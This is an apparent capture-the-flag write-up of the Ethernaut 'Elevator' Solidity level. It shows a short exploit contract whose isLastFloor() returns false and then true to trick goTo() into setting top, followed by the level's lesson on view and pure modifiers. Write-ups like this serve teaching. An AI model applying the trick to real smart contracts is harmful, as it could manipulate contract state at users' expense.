# 11) Elevator

Succes condition:
> This elevator won't let you reach the top of your building. Right?

We just need to set the `top` variable to `true`. The function `goTo()` can do that:

```
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);  //our contract need to be a Building

    if (!building.isLastFloor(_floor)) {  // isLastFloor need to be false
        floor = _floor;
        top = building.isLastFloor(floor);  // now isLastFloor need to be true
    }
}
```
So we just need to create a contract with a `isLastFloor(uint256)` function that return `false` the first time it is called and `true` the second time. This easily do the trick:

```
function isLastFloor(uint256 _floor) external returns (bool) {
    bool ret = top;
    top = !top;
    return ret;
}
```

---
Don't really understand what there is to learn here though.

---
## Level completed!

You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. gasleft().